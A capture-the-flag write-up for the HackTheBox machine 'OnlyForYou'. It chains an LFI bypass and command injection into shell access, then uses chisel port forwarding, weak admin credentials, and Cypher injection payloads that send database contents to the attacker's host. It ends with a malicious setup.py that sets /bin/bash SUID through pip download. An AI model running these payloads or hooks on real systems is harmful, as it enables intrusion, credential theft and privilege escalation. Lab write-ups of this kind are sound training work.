<h3> OnlyForYou HackTheBox </h3>

Difficulty = Medium

Nmap Scan:
![image](https://user-images.githubusercontent.com/127159644/236711287-ceef7d4e-9e1b-4ac7-badc-ebe28f16d87c.png)

Update your */etc/hosts* file with the content of the domain name *only4you.htb*

Going over to the web server shows this
![image](https://user-images.githubusercontent.com/127159644/236711396-45b855af-4ddc-4ac6-87a5-352a24ba7d72.png)

Using *ffuf* I fuzzed for subdomain on the vhosts
![image](https://user-images.githubusercontent.com/127159644/236711542-c0362d61-3615-4337-964a-b9767825ec42.png)

Adding the new sub domain *beta.only4you.htb* to my */etc/hosts* file
![image](https://user-images.githubusercontent.com/127159644/236711590-70da737f-b94f-4e51-8266-b1b4124cf0de.png)

Checking the sub domain shows this
![image](https://user-images.githubusercontent.com/127159644/236711622-20a4ed18-e7fc-4ab4-9bef-115d93b2d1f5.png)

I downloaded the source code for this web instance
![image](https://user-images.githubusercontent.com/127159644/236711685-b024754b-a351-45b8-bc32-75ec0f69703e.png)

There's a file upload functon but I didn't particularly find it interesting cause it was rather secured to me 🤔

But here's the vulnerable part of the code
![image](https://user-images.githubusercontent.com/127159644/236711846-fd096b18-edfa-475a-bfe6-d9d867d0b989.png)

The user can query files for download and there's a prevention against LFI but we can still achieve file inclusion without using *../*
![image](https://user-images.githubusercontent.com/127159644/236712019-dbbffe0c-5cf4-445f-8518-c5e59f253816.png)

I made a [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/htb/b2b/onlyforyou/enumerate.py) to automate finding of files 

We know that the server is hosted on *Nginx* from *Wappalyzer Result*

![image](https://user-images.githubusercontent.com/127159644/236713368-0084a968-f8bf-44ae-b873-11e106219ef7.png)

And the default path for web server (vhost) config running nginx is */etc/nginx/sites-enabled/default*

Checking it shows the web path to the vhost which turns out to be */var/www/only4you.htb/ and /var/www/beta.only4you.htb*
![image](https://user-images.githubusercontent.com/127159644/236713662-546d441f-f348-44a7-acef-080cda872f97.png)

Now we can enumerate more files

Out of curiosity we can tell that the web server is built with python and since the sub domain for the vhost has app.py then the doman should also have 🤔

Checking it shows that it's indeed there */var/www/only4you.htb/app.py*
![image](https://user-images.githubusercontent.com/127159644/236714308-46607e76-c122-4a0e-8a53-6525a37cf52b.png)
![image](https://user-images.githubusercontent.com/127159644/236714364-b44ee2ea-8bb5-4fb7-952d-59821593c155.png)

Looking at the code we can see that it is built on the *form* module 

Lets fetch the *form* module at */var/www/only4you.htb/form.py*
![image](https://user-images.githubusercontent.com/127159644/236714557-7fcf1c9c-a224-4d83-a68a-8e58ef829055.png)
![image](https://user-images.githubusercontent.com/127159644/236714641-daefa71d-a6bc-4502-a434-8d267d7dab9b.png)

Looking at the code we can see that it does:

```python
result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```

So far that variable shell is set to True we can basically inject command which will lead to command injection and maybe shell :D

Lets test it out
![image](https://user-images.githubusercontent.com/127159644/236715685-48a2499c-7918-4999-b4d0-20e46cf07711.png)

It works cool here's the [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/htb/b2b/onlyforyou/execute.py) that I made for it

Using it to get shell works
![image](https://user-images.githubusercontent.com/127159644/236715962-cef7b857-8b75-4845-bb32-d01a8c914c0f.png)

Here's how I stabilized my shell

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Checking the internal ports avaiable shows that a service is running on port 3000 and 8001
![image](https://user-images.githubusercontent.com/127159644/236716251-7e6f788d-86ce-4c4b-93a9-bad02d10b5a0.png)

Lets port forward using chisel shall we 🙂
![image](https://user-images.githubusercontent.com/127159644/236716419-626c5220-9a6a-4150-aeab-5ff3d51a0891.png)

```bash
Command:

Host: chisel server -p 9001 --reverse
Target: ./chisel client {host}:9001 R:3000:127.0.0.1:3000 &
```

We can confirm that it was successfully port forwarded by scanning our host
![image](https://user-images.githubusercontent.com/127159644/236716902-a733ac13-25e0-4a9f-9c1e-e3b7e3f67f08.png)

Now lets see what it contains or rather what it is 😅
![image](https://user-images.githubusercontent.com/127159644/236717017-4ae503d5-2697-4403-8c33-8eee48cc1f4d.png)

Hmmmm that's an instance of Gogs

I checked /explore to see if i can get any repo but i didn't tho i got two users which were *John and Administrator*
![image](https://user-images.githubusercontent.com/127159644/236717468-98e81d97-39c4-4766-9876-cfe9f608b44c.png)

Nothing much we can do now

Lets port forward the service on port 8001 and see what we can fetch 

After I did that (the same i port forwarded earlier) looking at the page shows this
![image](https://user-images.githubusercontent.com/127159644/236717677-1742d53a-3490-4f89-ad45-e317176d5214.png)

Trying weak cred *admin:admin* works
![image](https://user-images.githubusercontent.com/127159644/236717758-e9528367-0261-48b4-bfe9-62c79d54b704.png)

Poking around I saw the notes left by the admin

![image](https://user-images.githubusercontent.com/127159644/236717899-c48aa7c2-60f8-45d9-9d1e-2ac70d875c8d.png)

The db is based of neo4j interesting 🤔

There's a search function of the web app
![image](https://user-images.githubusercontent.com/127159644/236717977-991faca1-807d-4ac0-9506-617505ffc1fb.png)

Looking for how to exploit neo4j database leads to Cypher Injection here's the [source](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j)

We can test with this query through Burpsuite to know the version, then url encode and send it a web server hosted by us.

```sql
' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.175/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```

Trying the query leaks the version
![image](https://user-images.githubusercontent.com/127159644/236718595-8bf9d822-d889-4245-b196-6c50ed12e07b.png)
![image](https://user-images.githubusercontent.com/127159644/236718623-4da759bb-625a-4114-8357-512c73ff0cef.png)

Now lets get the list of tables

```sql
'OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.175/?label='+label as l RETURN 0 as _0 //
```

![image](https://user-images.githubusercontent.com/127159644/236719094-e295b16d-f40e-40da-b8a2-5d9665fb25a9.png)
![image](https://user-images.githubusercontent.com/127159644/236719119-0536de45-fbd8-409d-9061-66992e1759ba.png)

Lets dump the users 🙂

```sql
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.175/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

![image](https://user-images.githubusercontent.com/127159644/236719601-0f0aa538-ec26-414f-9ac9-f1a3478099ed.png)
![image](https://user-images.githubusercontent.com/127159644/236719571-89a3a6db-91a6-4e92-a0ad-fadbe415c235.png)

Cool we have the hash of two users *admin & john* since we already know the admin user's password which is *admin* lets crack that of John's
![image](https://user-images.githubusercontent.com/127159644/236719927-5c9ef76f-3feb-4610-a5ea-26b50b6ccfb0.png)

The password for user John is *ThisIs4You*

Lets try this over ssh
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b2ea6c18-eaef-4479-8b7d-495b7cafff0a)

Cool it works finally 😭

Lets escalate privilege to root 🙂

Checking sudo permission shows that the user can run `/usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz` as root
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fea37e1c-b355-42be-93dd-4b41103d4aa1)

Remember that the service running on port 3000 is Gogs

After searching for privilege escalation with *pip download* i found this [article](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)

I downloaded the repo and modified the setup.py file to make */bin/bash* suid
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ee0c4319-769b-467f-801f-8aa665b22f40)

```python
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    os.system("chmod +s /bin/bash")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)

class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "this_is_fine_wuzzi",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```

Now I will create the .tar.gz file that will be the one to be uploaded to the repository on Gogs.
![Uploading image.png…]()

```bash
pip install build --break-system-packages
python3 -m build
```

